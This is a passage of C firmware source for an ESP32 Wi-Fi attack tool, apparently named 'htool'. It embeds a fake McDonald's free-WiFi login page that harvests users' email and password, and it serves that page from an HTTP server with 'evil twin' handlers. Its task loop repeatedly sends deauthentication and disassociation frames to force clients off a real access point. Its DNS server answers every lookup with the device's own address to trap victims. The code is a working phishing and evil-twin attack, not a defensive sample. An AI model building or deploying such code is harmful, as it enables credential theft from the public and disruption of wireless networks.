3bfbvahhqM/FhhCUpR4IDujEXGIlzlfP+HfuPmv/AJyZuP8AnDObyfoS/wDON9hPaebRrCnW5JW10g6d9Xm5AfpWR4v730/sjl9FcxdUdPwjwud+f6XrvY6PtSNVP+WCDi4PT/dfXY/1MA/Txc9nxPmC+hl+ov8AzgV/zjp+Tf50eSPPOr/mZ5O/xLqOj65DZ6bcfpDUbP04GtlkK8bO5gVviJNWBObXs7TY8sSZi9/N8U/4J3tZ2n2Pq8OPR5eCMoWRwwlZ4iP4oyL2zWvy6/59k+XdZ1by/ra6Tp2s6Fez6fq+nya15l5wXVrI0U0TcbsiqOpBocvlj0USQeY8y81g7X9udRjjlx8ZhICQPh4twRYP09Q+Vf8AnITSf+cKNK1X8opPyeezuNIk8zR/8rQjsr7WrtjoyvAZARdTO61T1KGGj+G9Mw9SNMDHg5Xvz5PY+zGo9qM0NSNdxCXhnwrjjj+83r6QBzr6tnlX/OUc/wDzirP/AIG/6FlsprTj+k/8beqdYPKv1T6jT9LSP0/f/wB3/sv2cq1fgbeF53z+HN3HseO3x438rkH6eD+7/pcf92P6vP4dXyXmE9mWsWsuxYFrFgWsWIbxZhvFmHYtgbxbA7C2BvFsDsWwN4WwOxbQ7FsDsLaHYtgdhbQWsWwNjFsC8YsguGBmFwxZBcMDJdiyXYsm8CV2LJvFLeKXYq3gS3il2Kt4pdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdir9E/+fZn/AJPjzb/4AV//AN1TS82nZP8Aen+r+kPiP/B6/wCMLD/0MR/6Z5Xs9p+Q+g/nX/znd+dFx5wthf8AlDyKNL1HUtJJZVvLqewtEtYJeI/u/gd3HIcuIXdS2XDTjNqpcXIPK5PbDP7P+w2hjpTw5s3HES/mxE5mch/S3iBttd7EBmf5l/8AOd3kL8mPzA1H8qfKX5UW+reWPKV0NK8w3ljcwWEKSxUS4htLSO3dG9A8kIdkq6lfhHxGeXtGGGZhGOw+Dq+wf+BBru3tBHtHU6sxy5RxwEoymSDvEzmZAjj2OwlUSDvyYz/zl7+Vnkb/AAB5O/5y4/J6ytvL2r6PdaJrs0tlCsFvfWt5NC9lcywR0VZ4p3jBIoWDMHJKrSGtwx4Bmx7ci53/AANPaDW/n83s32nIzhMZMfqNyhKIInESO5hKIltvRAMaBNy3/nOiLT/zY/5xV8l/mzorf6Lp93pOvxGhNLPV4fqzxN04sss8Va9CpFN9rO0Ky4IzHkfm67/gRyydi+1Gfs7LzlHJj/zsR4gfP0xl87TH889YP/OP/wDzgx5c8lQTR2nmHzDoWm+Vo1QMK3GoQ/WNVZQtCKxif4jT4mFdzQnUHwNKI9SK+fNx/ZLTf6JvbbJqiCccMk8v+bA8OL/ZcG3cD702/Lz8u9G/5xR/5x/0Tzh5d/KS/wDzV/NzzBbWUuow6TYzahfSXt7GZzH60EE721pbKCCyoFZgK/G4w4sQ02ESEeKR/HycbtrtvN7advT02fWR02jgZCJnIQgIRPDdSlETyT50TYBP8MU+0nRrP/nMX8sfNej/AJw/kfqn5U+eNMIi0zU9V025tZUklR2trvT7y6toJHVWQrNEOQpTls65MR/NQInDhl7nD1Opn7C9pYsvZmvhqcEtyITjIECuKGSEZSAsG4S2/o7xL8ENV0280bU9S0fUIxDf6VdTWd9ECGCzQOY5F5CoNGUioznSKNP2Dp9RDUYo5YG4yAkPcRY+x+p3/Pt38w/LEmu3f5Zp+W2lxebLfTdS1iX80wYP0jJaGe0T9HkfVRL6dWDf70UqPsZt+y8kb4OHfc3+h+fP+Dh2LqY4RrzqpnCZwh4G/AJcMj4n1cPFtX0Xv9TAf+fhP5neUtU8/eY/yts/yq0jSfOHlvV9I1HVfzZhNv8ApLVLeTRlZbSYLZpNwUXUYHK4cfuV+Hpxh2lliZmHCLBG/fs7f/gNdg6rDocfaEtXOWHJDJGOA34eMjKfXH1mNnglyhH6zvzv6d/85Jfmx+W/5MeUtC87fmJ5XfzabfWUt/KunxW0FxLHqEtvNWZGuCEi4wiQF68qGgG5za6rNDFESkL32fBfYn2e7Q7d1WTS6LL4dwuZJMQYCUdjw7y9XDty2s8nyv8A84zeRfIn5j3v5r/85f8AmnyVLrV15g1rU73yV5XeD9Kz2lrZRhpWgtY0PrXUsgZIwFLfCOFC5zD0mOOTizSF7mhz/Be+9ue1tb2XDSezeDOIiEIRyTvwxKUztxSJ9OOMSDKyBueLaL0r8tvzg8x/nn5m1H8tvzh/5xR1/wAoeTNVtrgaDquu6NezWCrEjP6F49zYwxQM6KSjqwHOiD4ipy7FmlmPBkxkD3fsdH257N6f2f08dd2b2rjy5okcUceSInv/ABQEZylIA8xX0+o7AvhTRv8AnEDQm/5zTvvycu/Vl/LjSrdvNYgeZjPPoxRGjtTItG/3olEDMSG4gsDWhOvjox+Y8Ppz+H42fVdT/wAEfP8A6EI9pRr8zI+FdbDJvcq5fQOMDlxECqfdn5g/nV5l/KHztZ/lj+XH/OJ/mLzV+WulJaQa7reg6HeJZFJVRnWwjt7GSCcQI29WAZwUqtOWbDJmOKXBHGTHyH7Hyfsj2Y0/bWjlrtb2rjx6mXEYxyZI8Vi/7wymJR4j5bRqW/J8W/8APxP8gfKfkO88rfmv5I0uDy/p/nC6k03zHoltELe3F/6bXEVzFCFURtKiuJF2FVBpyLHMLtHTxgRKOwL6X/wHPa3VdoRy9n6qRnLEBKEibPBfCYk9RE1w+RIugH5h5rX3Av3q8nXT/np/z71vLAwnU9YtPJV7pf1aYh3kv/Lhb6pVmP23NrE6knYkEnN7A+LpK8vufk3tLGOwPbcTvhgc8ZWNgIZq4vgBOQI8ku8qebbf/nF//nDn8ib+SddNu/NGt+XZ9SmuBRjDrWoDVr8OABSlgske/QAV3wQn+X08D3kfbv8Ac2doaCXtT7U66IHEMcMoFd+KHhY69+ThPn7kf/zkB+UCeZv+cxf+cXfNyabJc2N8br9M3MfIxI/ljnqtq0pXYcmk4iuzU44dTh4tRjP423aPZX2gOl9mO0tPxASHDwjr++rHOvgPhdvl7/n6F52/SHn78u/y/gmcw+WdGn1i+jU/u/rGqTekisK7skdpUVGwfY7nMTtXJcxHuH3va/8AAV7N8PR6jVkbzmIDvqAs/Amfzj5B9Af8/Qf/ACTfkP8A8DOL/unXuZPav92Pf+h5P/gL/wDGpm/4Sf8AdwfnjN/zgn/zlVbwyzzflZwigRpJX/TmhmiqKk0GoE9BmtPZ+f8Am/aP1vqw/wCCZ7PSNDU8/wDa8v8AxD75/wCfXH/ktvzN/wDAlg/6g0zYdk/RL3vln/Bn/wAf0/8Aws/7opx57/59ueVPPXnjzl52uPzQ1bT7jzjrmo65PYR6fA6QPqFzJctErGUFghkoCRhydlicjLi5m+Ti9m/8FnU6LS4tONPAjHCMAeI78AEb+NPjv8zP+catJ/5xt/5yA/5x00nSvNN35oTzP5l0u7mmu7eO3MRt9VtYwqiN2rXlXfMLLpRgywAN2R973PZPtdl9oeyNfPJjEODHIbEm7hLv9z3T/n6v/wCUG/8ABo/7tGZHa/8AB8f0POf8Br/kZ/yS/wCnj8hM0r7aWsWsuxYFbiwLsUBvFmG8WYdizDeLYHYWwN4tgLeLYHYtgdhbA7FtDsLaHYtgdhbQ0cWyLYwtgXDAzC8YGQXDFkFwxZhdgS3iyXDAyDeKV2LJvFLsVbwJbxS7FXYpbxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV+if8Az7M/8nx5t/8AACv/APuqaXm07J/vT7v0h8R/4PX/ABhYf+hiP/TPK+k/Jf5u+Xfy5/5zx/PXyz5pvodI038xV0e0sNVuHEcKajaWFs1vFIzCiiVZZFBLAcuK78tsnHnGPVTEuReE7U9mtR2r7Ddn6jTxMpafxCYgWeCU5cRHfwmMSRXKz0YX+d3/AD7287+efzf8xecvJHmjQrPyr521WXV9TTUpLpbuxnvJPVvCkaRSrMGkZ3Qc068DxA5ZDUdmTnkMokUTbtfZP/g06Ls7sjHpdXiyHNhgIR4RHhmIioWSQY0AIy2ly4tyaZd/zm35z8mflN/zjn5d/wCccdI1VNS8wXtjo2mrYBla4h0zRngm+t3Sgn0zNJboEBpyq/GoRsnr5xxYRiB32+QdZ/wKOy9Z217Q5O3MkOHGJZJX/CcmUSHBHv4RMk9217yCM/5wa1fSPzm/5xt80/kz5oZLxPKd81lNaSkSltMv5PrtsWVwdhOsyAdAFFMezyM2E4z0/taf+C3pcvYPtFi7U0+3ix4gRt+8gOCVV/R4D7y+eP8An5X+Y/6d/M3yx+W9lc87LyJpn1zVIklqv6Q1Ti/CSMbBo7eOJlJ3pIaUB3x+1cvFkEe79L2v/AJ7D/Ldm5ddIerNPhjt/Bj2sHuMzIGv5g+H0A07z55s/wCcgP8AnH3RvMX/ADjr+Ydj5P8AP9rFaHUI7qC1u1hu4IjHdaZex3NvdeiGY80kEdSFRgfTY12Mcks+EHEal+NnxrP2PpfZnt6eDtvTSy6cmVUZRuJNwywMZQ4q5SjxULkD6htBNA8u/wDOVfl7yR5u81/nt/zk9YeQP0ZbtJpNxp2jaBd2ttwBJlvTNpsXqcjQLFEwY/zVPEVxjnjEyyZK+A/U7fW672X1Otw6fsjsuWbiPqEsmaMpeUOHJKvOUgR5ULfhX5m1S51zzH5g1q81FtXu9Y1K7vbrVmhS2a6kuJmkecwR/DGZCxbguy1oM5+Rskl+ttBp46fTY8UY8AhCMRG+LhEQAI8R3lXKzz5vuj/n2v8A+tBar/4Buo/9Rdjmx7L/AL34F8k/4Of/ABgw/wCHw/3M3mX/ADnd/wCtV/mn/wBuP/uh6flXaH9/L4fcHef8CT/nGNJ/yU/6a5H6C/8APzz/AMk55E/8DKL/ALp97my7V/ux7/0PjX/AI/418/8Awg/7uCG/59/fmdovmj8kNU/JrTfMieV/zF8t/pRtJkKwyXAt9RaSaHULWC4DRzm3mlPNCrKKLzHFxUdnZRLGYXUhf9rL/gw9hZtJ2zHtOePxNNk4OLmI3ACJxylGjHjiNjYJs8JuJZ15I/L7/nOyXzdLD+ZH5/aTpfkWxMrTaroul6LLfXSivp+jHPpASKvVjJWnQBuosx49VxeqYr3D9TqO1e2fYsaUHRdnzlnNemc8ohHvsxy3LuAFXzscnzT+Xv546Z5P/wCc4NSn89fm/B+Zuk6h5fm8jQfmPJYWOlWtsWuY76CGT6n6cDrHNF6TTgUZmrQIKjFxagR1NylYqr5Pbdsey2TW+xsRpNGdPOOQZzi4p5JS9JhKQ47kCYniEDyiOsufrj84fKH/ADmfqf5hC/8AyU/N/RNJ/LfWRbNFp+oWGmvLplI0SYh5NOuJLhGIMinnXfj0AJzc0NQZ+iQ4fht9j517OdpeyWLQ8HaejnLUxveMpgT3JGwyRESPpO1bX5Ph3/n4BeebPL+leS/IHmf/AJyAl/M29e4h1bVfJFxo2k2c1jdQW0sIvzc6bbwMiSeu6xwyAmhLcm4g5g9oGQAiZ35UP0PqH/AjhptTlzavBoBgjRhHIJ5JCUTIHw+HJKQJHCDKceoqhdPzCzVvuBfsl/z7B84Ran5T/NP8sL+ssVjeQa3aQu1VeHUITaXSAdVCm3jJp/Pm57LnYlA+9+bv+Dh2ccWq02ujtxRMD74Hiif9kf8ASsR/5+deZ7ewP5P/AJV6ZKkdppFjc6zd2A3ZU+CxsWNOgCxTgeP0ZDtSVcMB0cz/AICehlk/N66Y3kRAH5zn98H6M/kB5jsfzQ/Jz8nvP916V5q8ehxLLex/s30UJsL8DrSssbgj2zZaaQyY4y61+x8f9qtFLsvtTV6SNiPGaH9Enjh/sSH4J/8AOXXnf/H3/ORX5o6zHcNPY2GrNoumk/ZEOkqtlVP8l3iZx48q9857WT48sj5/c/UPsD2b+Q7D02MipSjxn35PXv5gED4P02/5+g/+Sb8h/wDgZxf9069za9q/3Y9/6Hxf/gMf8amb/hJ/3cHxRP8A8/F/+cjLmCa3ln8tNFPG0cgGlkVVwQd/W8DmAe0s3l8n0Mf8CXsSJBHibf0/2PsL/n1x/wCS2/M3/wACWD/qDTM3sn6Je94D/gzf4/p/+Fn/AHRflX/zkH/5Pv8AO/8A8D/zL/3VLnNRqf72fvP3vs/sx/xkaT/hGL/cRS38lf8Aycn5S/8AgZ6D/wB1GDBg/vI+8fen2i/4zNT/AMKyf7gv0u/5+r/+UG/8Gj/u0ZtO2P4Pj+h8i/4DX/Iz/kl/08fkHmlfbS7FgWsWstYsS7FiGxizDeLMOxZhvFsDsWwN4WwOxbA3i2B2FsDsW0OxbA7C2h2FtDWLYHDC2BeMDMLhiyC4YGYXYsl2BkuxZN4EhdiybxS3ilvFLeBLsVbxS7FW8UuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2Ksi8s+cPNvkq/m1Xyb5o1fylqlxbtaT6lot9PYTvA7I7RNLbvGxQtGrFSaVUHsMnCcoG4kj3ODr+zNJ2hjGPVYoZYA2IziJxB3F1IEXRIvzKB1vXdb8y6pd655j1i+8wa1flWvtY1K4lu7qYooRTJNMzOxCqFFT0AGCUjI2TZbdJo8GkxDDghGEI8oxAjEddoigN92Y6b+cX5uaLp6aTo/5p+b9J0qNBHHpllrl/BbqgFAoijmVQKdqZOObJEUJED3urz+zHZOoyeJl0mCUzvxSxwMvmY2wK9vr3Urqe/1G7mv766cyXV5cyNLLI56s7uSzE+JOV3buMWGGGAhjiIxHIAUB7gGQeV/PXnfyPLeT+SvOOueT59QRI7+bRNRudPedIySiytbSRlwpJIB6ZKGSUPpJHucHtDsjRdoiI1eDHlEeXHCM6vnXEDVpRrWua15k1S71vzDq97r2s6gwe/1fUbiS6up2VQgaWaZmdyFUCpPQYJSMjZNlydLpMOkxDFghGEI8oxAjEddoigEV5f8ANXmfyleHUfKvmPVPLOoMvFr7SbyaymKg1oZIHRqV98MZmJsGmrW9nabWw4NRihkj3TiJj5SBCP8AM35gefPOixL5x87a/wCbFgcSQrrOpXV+EcLxDKLiR6GhpUdsM8kp/USfe4+h7G0OgJOlwY8V7HghGH+5AYfkHYsg8tebfNfkzUH1fyf5m1bynqskLWz6no17PYXDQuVZozLbujlSVBIrSoHhk4TlA3E17nB1/Z2l1+Pw9Tihlhd8M4icb76kCL3O6E17zBr3mnVbvXvM+t3/AJj1y+4fXtZ1S5lvLub0o1ij9SeZnduKIqip2AAGwwSkZGybLLSaPBo8Qw4IRx443UYgRiLNmoxoCyST5m0/80fmd+ZPnezg07zp+YXmXzdp9rMLm1sda1a81CGOYKyCRI7mWRVbixFQK0JGTnlnPaRJ95cHQdhdndnzM9Lp8WKRFEwhGBI50TEA1Y5MPsr69027gv8ATryfT761cSWt7bSNFLG46MjoQykeIOQBp2GbFDLEwnESieYIsH3gs31f83vzY8wac+j69+Z/m3W9JljaGTS7/W7+5tmjYUZDFLMyEEbEUyyWachRkT8XT6f2c7L02TxMWlwwmDfFHHCMr77At50crduXoGk/m5+a+gaYmiaF+Z3mzRNGjQRx6RYa1fW1qqDoohimVAB4Uy2OWcRQka97pNT7O9majIcuXS4ZzO/FLHCUr95FsDvby71C6uL6/upr69u5Glury4dpZZZGNWd3clmJPUk5C7dnjxQxREIACI2AAoAeQQuBSybyv5z84+SL2fUvJfmvWfKGo3UBtbnUNFv7jT55ICyuYnktnjZlLIp4k0qAe2SjOUDcSR7nW6/s3S66AhqcUMkQbAnETAPKwJA7+an5l82+avOmorq/nHzNq3mzVkhW3XVNZvZ7+4EKFisYluHd+KliQK0FTglOUjcjbDSaDTaHH4enxwxwu6hERF99RAFsj8v/AJvfmz5S0uDQ/Kv5oebfLOi2zO9to+k63f2VrG0jF3KQwTIgLMSTQbnfJRzTiKEiB73X6zsDs3V5Dlz6bFOZ5yljjKRrYWSCdgwG4uJ7qee6up5Lm6uZGluLiVi8kkjnkzuzVJJJqScqt2IhGERGIoDYAcgGZ+aPzP8AzK88WcGnedPzD8zeb9PtJhc2threrXmoQxTBWQSpHcyyKrcWI5AVoSMsnlnMVIk+8up0fY2h0MzPTYMeORFEwhGBI7riBswbKnPLNvK35l/mP5Gtrqz8lfmB5k8n2d7KJry10TVbzT4ppQOIeRLaWMMwApUitMshlnD6SR7i6nXdkaLWyEtRgx5CBQM4RkQO4cQLFNR1DUNXv77VdVvrjU9U1O4lu9S1K7laa4uLiZzJLNNLIWZ3dmLMzEkk1OQJJNlyceKGKAhACMYgAACgANgABsAByCyyvbzTby01HTruaw1CwmjubC/tpGimgmiYPHJFIhDIyMAQwNQdxgBINhhlxxyRMJgGJBBB3BB5gjqCyXzX+YXn7z39Q/xx548wecv0V6v6L/Tup3Wo/VvX4er6P1mSThz9NeXGleIr0GSnknP6iT7y4Gj7M0mi4vy+GGPiq+CIjdXV8IF1Zr3sPyDll2LWWsWBaxYF2KA7FkF2LMOxZh2LYG8WwN4WYdi2hvFsDsLYHYtodi2B2FtDsWwOwtoa74WwLhgZhcMWYXjAyC4YsguGLILsDJvFkuwMm8Ut4pbxS3il2BW8UuxVvFLsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVdirsVaxQ7FWsVdhQ1ihrFDWKGsUNYoW4WLRxYlacLErTixKw4sStOFgVpwsC7A1l2BrLsWst4tRawNRdi1l2BrLWLUXYtZaxay7A1lrFgXYtZaOLAuxYFoYEN4WYdiyDeLYG8WYd9GLYHYWwN4tgbxbA7FsDhhbQ7FsDsLaHYtgdhbQ1i2BsYWYXjAzC4YGYXDFkFwwMguGLILsUt4GTeKV2LJvFXYEt4pbxS7FXYq3il2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxV2KuxVrFDsVaxQ7CrWKGsUNYoW4sWsKGjixK04oK04WJWnFgVhwsStOLArcLAt4GsuwNZdi1F2LWXYGouxay7A1FrFrLsWstYtZdgay1iwLWLWWsWJdiwLhigNjriyDsWYdizDeLMN4tgbwtgdi2B2LYHYWwN4todi2Rdi2h2FsDsLaGsWwNjFsC4YswuGBkF4xZBcMDNdikN4sl2BkG8Ut4pbxS3ilvAl2Kt4pbxS7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FXYq7FDWKtYodirWFDsUNYq1ihbixawoW4sWjhYlYcWJWnFiVpwsCsOLEtYWBbwNRdgay7FqLsDXJvFqLWBrk7FqLWLWXYtZawNZaxay7FgWsWBdiwLWLEv/9k=');\n"
                   "      background-size: contain;\n"
                   "      height: 400px;\n"
                   "      display: flex;\n"
                   "      align-items: center;\n"
                   "      justify-content: center;\n"
                   "      text-align: center;\n"
                   "    }\n"
                   "    .banner h2 {\n"
                   "      font-size: 48px;\n"
                   "      color: #fff;\n"
                   "      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);\n"
                   "    }\n"
                   "    .content {\n"
                   "      margin:0 auto;\n"
                   "      color: #FFC72C;\n"
                   "      text-align: center;\n"
                   "    }\n"
                   "    .content .box {\n"
                   "      background-color: #fff;\n"
                   "      border: 1px solid #ccc;\n"
                   "      box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);\n"
                   "      width: 300px;\n"
                   "      height: 300px;\n"
                   "      margin: 20px 0;\n"
                   "      display: flex;\n"
                   "      align-items: center;\n"
                   "      justify-content: center;\n"
                   "      flex-direction: column;\n"
                   "      text-align: center;\n"
                   "    }\n"
                   "    .content .box h3 {\n"
                   "      margin: 0;\n"
                   "      font-size: 24px;\n"
                   "      color: #000;\n"
                   "      font-weight: 600;\n"
                   "    }\n"
                   "    .content .box p {\n"
                   "      margin: 10px 0;\n"
                   "      font-size: 16px;\n"
                   "      line-height: 1.5;\n"
                   "    }\n"
                   "    .content .box ul {\n"
                   "      list-style: none;\n"
                   "      margin: 0;\n"
                   "      padding: 0;\n"
                   "    }\n"
                   "    .content .box li {\n"
                   "      margin: 10px 0;\n"
                   "      font-size: 14px;\n"
                   "    }\n"
                   "    footer {\n"
                   "      background-color: #000;\n"
                   "      color: #fff;\n"
                   "      padding: 20px;\n"
                   "      text-align: center;\n"
                   "    }\n"
                   "    footer p {\n"
                   "      margin: 0;\n"
                   "      font-size: 14px;\n"
                   "    }\n"
                   "    footer a {\n"
                   "      color: #fff;\n"
                   "      text-decoration: none;\n"
                   "    }\n"
                   "    .login-page {                       \n"
                   "      width: 400px;\n"
                   "      margin:0 auto;\n"
                   "      text-align: center;\n"
                   "    }\n"
                   "\n"
                   "    .form {\n"
                   "      position: relative;\n"
                   "      z-index: 1;\n"
                   "      background: #ae101f;\n"
                   "      max-width: 360px;\n"
                   "      margin: 0 auto 100px;\n"
                   "      padding: 45px;\n"
                   "      text-align: center;\n"
                   "      box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);\n"
                   "    }\n"
                   "\n"
                   "    .form input {\n"
                   "      font-family: 'Roboto', sans-serif;\n"
                   "      outline: 0;\n"
                   "      background: #ae101f;\n"
                   "      width: 100%;\n"
                   "      border: 0;\n"
                   "      margin: 0 0 15px;\n"
                   "      padding: 15px;\n"
                   "      box-sizing: border-box;                 \n"
                   "      font-size: 14px;\n"
                   "      border-radius: 10px;\n"
                   "      border: 1px solid #83b5f7;\n"
                   "    }\n"
                   "\n"
                   "    .form button {\n"
                   "      font-family: 'Roboto', sans-serif;\n"
                   "      outline: 0;\n"
                   "      background: #FFC72C;\n"
                   "      width: 100%;\n"
                   "      border: 0;\n"
                   "      padding: 15px;\n"
                   "      color: #FFFFFF;\n"
                   "      font-size: 14px;\n"
                   "      -webkit-transition: all 0.3 ease;\n"
                   "      transition: all 0.3 ease;\n"
                   "      cursor: pointer;\n"
                   "      border-radius: 10px;\n"
                   "    }\n"
                   "\n"
                   "    .form button:hover,\n"
                   "    .form button:active,\n"
                   "    .form button:focus {\n"
                   "      background: rgb(#1a73e8);\n"
                   "    }\n"
                   "  </style>\n"
                   "</head>\n"
                   "<body>\n"
                   "  <div class=\"container\">\n"
                   "    <header>\n"
                   "      <div class=\"logo\"></div>\n"
                   "      <h1>Welcome to McDonald's</h1>\n"
                   "    </header>\n"
                   "    <nav>\n"
                   "      <ul>\n"
                   "        <li><a href=\"#\">Menu</a></li>\n"
                   "        <li><a href=\"#\">Locations</a></li>\n"
                   "        <li><a href=\"#\">Deals</a></li>\n"
                   "        <li><a href=\"#\">About Us</a></li>\n"
                   "      </ul>\n"
                   "      <form>\n"
                   "        <input type=\"text\" placeholder=\"Search\">\n"
                   "        <button type=\"submit\">Go</button>\n"
                   "      </form>\n"
                   "    </nav>\n"
                   "    <div class=\"banner\">\n"
                   "    </div>\n"
                   "    <div class=\"content\">\n"
                   "    \n"
                   "    <h3>To use the WiFi for free, log in with your credentials from the McDonalds App!</h3>\n"
                   "    <div class='login-page'>\n"
                   "       <div class='form'>\n"
                   "         <form class='login-form' action='/validate' method='GET'>\n"
                   "           <div class='circle-mask'></div>\n"
                   "           <h2>Login</h2>\n"
                   "           <br>\n"
                   "           <input id='g' type='email' placeholder='Mail' name='user' required>\n"
                   "           <input id='g' type='password' placeholder='Password' name='pass' required>\n"
                   "           <input type='hidden' name='url' value='google.com' style=\"display: block; margin: 0 auto;\" >\n"
                   "           <button id='l' style=\"display: block; margin: 0 auto\"; type=\"submit\">Enjoy Free WiFi!</button>\n"
                   "         </form>\n"
                   "      </div>\n"
                   "  </div>  \n"
                   "</div>\n"
                   "<footer>\n"
                   "       <div class=\"box\">\n"
                   "        <h3>Terms of Use</h3>\n"
                   "        <p>By accessing the McDonald's WiFi network, you agree to the following terms of use:</p>\n"
                   "        <ul>\n"
                   "          <li>The WiFi network is for personal use only.</li>\n"
                   "          <li>Illegal activity is strictly prohibited.</li>\n"
                   "          <li>Use of the network is at your own risk.</li>\n"
                   "          <li>McDonald's is not responsible for any damages resulting from the use of the WiFi network.</li>\n"
                   "        </ul>\n"
                   "      </div>\n"
                   "  <p>Copyright 2021 McDonald's Corporation. All rights reserved.</p>\n"
                   "</footer>\n"
                   "</div>\n"
                   "</body>\n"
                   "</html>"};

int htool_wifi_start_httpd_server() {
    ESP_LOGI(TAG, "Starting HTTPD server");

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_open_sockets = 4; //TODO: maybe adapt everywhere
    config.lru_purge_enable = true;

    if ((httpd_start(&server, &config) != ESP_OK)) {
        ESP_LOGE(TAG, "Failed to start HTTPD server");
        goto exit;
    }
    if (captive_portal_task_args.is_evil_twin) {
        ESP_LOGD(TAG, "Registering evil twin URI handlers");
        httpd_register_uri_handler(server, &captive_portal_uri_router);
    }
    else {
        ESP_LOGD(TAG, "Registering captive portal URI handlers");
        if (captive_portal_task_args.cp_index == 0) {
            httpd_register_uri_handler(server, &captive_portal_uri_google);
        }
        else {
            httpd_register_uri_handler(server, &captive_portal_uri_mcdonalds);
        }
    }
    ESP_LOGI(TAG, "HTTPD registered URI handlers");

    return HTOOL_OK;
    exit:
    return HTOOL_ERR_GENERAL;
}

void httpd_server_task() {
    htool_wifi_start_httpd_server();
    while (cp_running) {
        while (cp_running && !target_connected && captive_portal_task_args.is_evil_twin) {
            htool_wifi_send_deauth_frame(captive_portal_task_args.ssid_index, false);
            htool_wifi_send_disassociate_frame(captive_portal_task_args.ssid_index, false);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    vTaskDelete(NULL);
}

static char *parse_dns_name(char *raw_name, char *parsed_name, size_t parsed_name_max_len) {
    char *label = raw_name;
    char *name_itr = parsed_name;
    int name_len = 0;

    do {
        int sub_name_len = *label;
        name_len += (sub_name_len + 1);
        if (name_len > parsed_name_max_len) {
            return NULL;
        }
        memcpy(name_itr, label + 1, sub_name_len);
        name_itr[sub_name_len] = '.';
        name_itr += (sub_name_len + 1);
        label += sub_name_len + 1;
    } while (*label != 0);
    parsed_name[name_len - 1] = '\0';

    return label + 1;
}

static int parse_dns_request(char *req, size_t req_len, char *dns_reply, size_t dns_reply_max_len) {
    if (req_len > dns_reply_max_len) {
        return -1;
    }
    memset(dns_reply, 0, dns_reply_max_len);
    memcpy(dns_reply, req, req_len);

    dns_header_t *header = (dns_header_t *)dns_reply;
    ESP_LOGD(TAG, "DNS query with header id: 0x%X, flags: 0x%X, qd_count: %d",
             ntohs(header->id), ntohs(header->flags), ntohs(header->qd_count));

    if ((header->flags & OPCODE_MASK) != 0) {
        return 0;
    }
    header->flags |= QR_FLAG;

    uint16_t qd_count = ntohs(header->qd_count);
    header->an_count = htons(qd_count);

    int reply_len = qd_count * sizeof(dns_answer_t) + req_len;
    if (reply_len > dns_reply_max_len) {
        return -1;
    }

    char *cur_ans_ptr = dns_reply + req_len;
    char *cur_qd_ptr = dns_reply + sizeof(dns_header_t);
    char name[128];

    for (int i = 0; i < qd_count; i++) {
        char *name_end_ptr = parse_dns_name(cur_qd_ptr, name, sizeof(name));
        if (name_end_ptr == NULL) {
            ESP_LOGE(TAG, "Failed to parse DNS question: %s", cur_qd_ptr);
            return -1;
        }

        dns_question_t *question = (dns_question_t *)(name_end_ptr);
        uint16_t qd_type = ntohs(question->type);
        uint16_t qd_class = ntohs(question->class);

        ESP_LOGD(TAG, "Received type: %d | Class: %d | Question for: %s", qd_type, qd_class, name);

        if (qd_type == QD_TYPE_A) {
            dns_answer_t *answer = (dns_answer_t *)cur_ans_ptr;

            answer->ptr_offset = htons(0xC000 | (cur_qd_ptr - dns_reply));
            answer->type = htons(qd_type);
            answer->class = htons(qd_class);
            answer->ttl = htonl(ANS_TTL_SEC);

            esp_netif_ip_info_t ip_info;
            esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"), &ip_info);
            ESP_LOGD(TAG, "Answer with PTR offset: 0x%" PRIX16 " and IP 0x%" PRIX32, ntohs(answer->ptr_offset), ip_info.ip.addr);

            answer->addr_len = htons(sizeof(ip_info.ip.addr));
            answer->ip_addr = ip_info.ip.addr;
        }
    }
    return reply_len;
}

void dns_server_task(void *pvParameters) {
    char rx_buffer[128];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (cp_running) {
        sockaddr_in_t dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(DNS_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
            break;
        }
        ESP_LOGI(TAG, "Socket created");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
        }
        ESP_LOGI(TAG, "Socket bound, port %d", DNS_PORT);

        while (cp_running) {
